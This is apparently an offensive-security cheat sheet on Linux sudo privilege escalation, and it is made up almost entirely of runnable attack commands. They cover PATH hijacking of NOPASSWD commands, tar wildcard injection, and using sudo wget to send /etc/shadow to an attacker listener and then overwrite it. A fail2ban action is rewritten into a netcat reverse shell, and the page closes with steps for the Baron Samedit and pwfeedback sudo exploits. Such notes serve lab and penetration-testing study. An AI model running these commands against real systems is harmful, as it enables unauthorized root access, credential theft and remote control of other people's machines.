---
title: Sudo PrivEsc
desc: The "sudo" command may be vulnerable to privilege escalation.
tags: [Linux, PrivEsc, Privilege, Sudo]
alts: [Linux-Privilege-Escalation]
render_with_liquid: false
---

## Investigation

- **Version**

    ```sh
    sudo --version
    ```

    If the sudo **version <=1.28**, try the following command.

    ```
    sudo -u#-1 /bin/bash
    ```

- **As Another Users**

    ```sh
    sudo su root
    sudo -u john whoami
    ```

- **Privileges**

    ```sh
    sudo -l
    sudo -ll

    # Specify hostname
    sudo -h <host-name> -l
    # Execute via the hostname
    sudo -h <host-name> /bin/bash
    ```

    Or from the config file:

    ```sh
    cat /etc/sudoers
    cat /etc/sudoers.d/usersgroup
    ```

<br />

## Command Forgery (NOPASSWD)

If you are allowed to execute some command, you can forge the contents of the command.  
First off, check the properties.

```sh
sudo -l
(root) NOPASSWD: somecmd
```

If you can confirm that it can be executed as root without password, create the same named command in the arbitrary folder in which you can write files.

```sh
# option 1
echo /bin/sh > /tmp/somecmd
```

Next, change the permission for allowing to execute it.  
And add the path to the environment.

```sh
chmod +x /tmp/somecmd
export PATH=/tmp:$PATH
```

Now execute the command as root.  


```sh
sudo somecmd
whoami
# root
```

<br />

## Command Forgery (SETENV, NOPASSWD)

If you found there is a **SETENV:** in sudoers, you can set the **PATH** when running the command.

```sh
sudo -l
(root) SETENV: NOPASSWD: somecmd
```

As the previous section, prepare the payload.

```sh
echo '/bin/bash -p' > /tmp/somecmd
chmod +x /tmp/somecmd
```

Now run the command as root with setting the PATH.

```sh
sudo PATH=/tmp:$PATH somecmd
whoami
```

<br />

## Wget Abusing /etc/shadow

Get **"/etc/shadow"** and generate a new hash passwd, then set it to the shadow file, next upload it.  
That changes the root password.

First, check the current user's privileges.  
If you find that 'wget' is executable as root, you can abuse /etc/shadow and create a new root user.

```sh
sudo -l
(root) NOPASSWD: /usr/bin/wget
```

Open listener in local machine.

```sh
nc -lvnp 4444
```

In target machine, display the contents of the **"/etc/shadow"** to the local machine using the following command.  
Then you can see the contents of the **"/etc/shadow"** via the listener you opened with Netcat.

```sh
sudo /usr/bin/wget --post-file=/etc/shadow <local-ip> 4444
```

Next, copy the above output into the file in the local machine.

```sh
vim shadow.txt
```

Generate a new hash password for a new root user in local machine.  
You will create a new root user in a later section.

```sh
openssl passwd -6 -salt salt password
```

Copy the generated password and paste it at the password of the root user into the **"shadow.txt"**.  
As a result, the contents of the **"shadow.txt"** should look like this:

```sh
root:$6$salt$IxDD...DCy.g.:18195:0:99999:7:::
...
```

To put the **shadow.txt** into the target machine, start web server for hosting this file.

```sh
python3 -m http.server 8000
```

Download this file into the **/etc/shadow** in remote machine. To do that, you need to run as root.

```sh
sudo /usr/bin/wget http://<local-ip>:8000/shadow.txt -O /etc/shadow 
```

Finally, you can switch to the root user with the password you created.

```sh
su root
```

<br />

## Shutdown and Poweroff

```sh
echo /bin/sh > /tmp/poweroff
# or
echo /bin/bash > /tmp/poweroff

chmod +x /tmp/poweroff
export PATH=/tmp:$PATH

# Some SUID command
sudo /usr/sbin/shutdown

# Then you are root user
root>
```

<br />

## Vim

If you are allowed to run the "vim" command, you can execute commands as root.

```sh
sudo vim /example.txt
```

In Vim editor, you can run commands as root.

```sh
:r!whoami
```

<br />

## Wildcard Injection with Tar

First, check if it is allowed to execute the **'tar'** command as root.

```sh
sudo -l
(root) NOPASSWD: /opt/backups/backup.sh
```

Check the contents of the "backup.sh".

```sh
# Move to the directory and check the content.
cd /opt/backups
cat backup.sh
```

This is the expected contents in "backup.sh".  
You should see that it creates an archived file from anywhere - **wildcard(*)**.

```sh
# -cf: create an archived file
tar cf backup.tar *
```

Now create the payload for privilege escalation.

```sh
cd /opt/backups
echo -e '#!/bin/bash\n/bin/bash' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

Confirm that it changes the current user to root.

```sh
whoami
```

<br />

## fail2ban

Check the properties.

```sh
sudo -l
(root) NOPASSWD: /etc/init.d/fail2ban restart
```

Confirm that the config file is writable.

```sh
find /etc -writable -ls 2>/dev/null
# output
4 drwxrwx--- 2 root security  4096 Oct 16 08:57 /etc/fail2ban/action.d
```

Look inside of **"/etc/fail2ban/jail.conf"** to know more about how fail2ban is configured.

```sh

less /etc/fail2ban/jail.conf

# ---------------------------------------------

# output

...
# "bantime" is the number of seconds that a host is banned.
bantime  = 10s

# A host is banned if it has generated "maxretry" during the last "findtime"
# seconds.
findtime  = 10s

# "maxretry" is the number of failures before a host get banned.
maxretry = 5
...

```

For privilege escalation, we can write the **"iptables-multiport.conf"** - actionstart, actionstop, actioncheck, actionban, actionunban.

```sh
ls -al /etc/fail2ban/action.d/iptables-multiport.conf
# copy this file into the home directory for editing the content
cp /etc/fail2ban/action.d/iptables-multiport.conf ~
vim ~/iptables-multiport.conf

# ---------------------------------------------------------

# Edit actionban

...

actionban = /usr/bin/nc <local-ip> <local-port> -e /bin/bash

...

# ---------------------------------------------------------
```

Then move back the config file to the original one.

```sh
mv ~/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf
```

To apply the configuration, restart it as root.

```sh
sudo /etc/init.d/fail2ban restart
```

Start listener in local machine.

```sh
nc -lvnp 4444
```

Try to login with the wrong passwords so that you will get banned.

```sh
hydra -l root -P passwords.txt <target-ip> ssh
```

After a short time, you will get the root shell via listener.

<br />

## Buffer Overflow

1. **Baron Samedit (Heap Buffer Overflow)**

    1. **Check Vulnerability to Overwrite Heap Buffer in Target Machine**

        ```sh
        sudoedit -s '\' $(python3 -c 'print("A"*1000)')
        malloc(): invalid size (unsorted)
        Aborted
        ```

    2. **PoC**

        See **[this repository](https://github.com/lockedbyte/CVE-Exploits/tree/master/CVE-2021-3156){:target="_blank"}{:rel="noopener"}**.

2. **Pwfeedback**

    1. **Check Enabling the Pwfeedback in /etc/sudoers**

        If so, when running sudo command and inputting password, asterisk will be displayed.  
        You can make it the buffer overflow.

        ```sh
        cat /etc/sudoers

        # -------------------------------------------

        ...
        Defaults pwfeadback
        ...
        ```

    2. **Input Long String to Password**

        ```sh
        perl -e 'print(("A" x 100 . "\x{00}") x 50)' | sudo -S id
        # [sudo] password for tryhackme: Segmentation fault
        ```

    3. **Download a Payload and Compile in Local Machine**

        ```sh
        wget https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/master/exploit.c
        gcc -o exploit exploit.c
        ```

    4. **Transfer the Payload to Remote Machine**

        ```sh
        # In local machine
        python3 -m http.server 8000

        # In remote machine
        wget http://<local-ip>:8000/exploit
        ```

    5. **Execute the Payload in Remote Machine**

        After that, you'll get a root shell.

        ```sh
        chmod 700 ./exploit
        ./exploit
        ```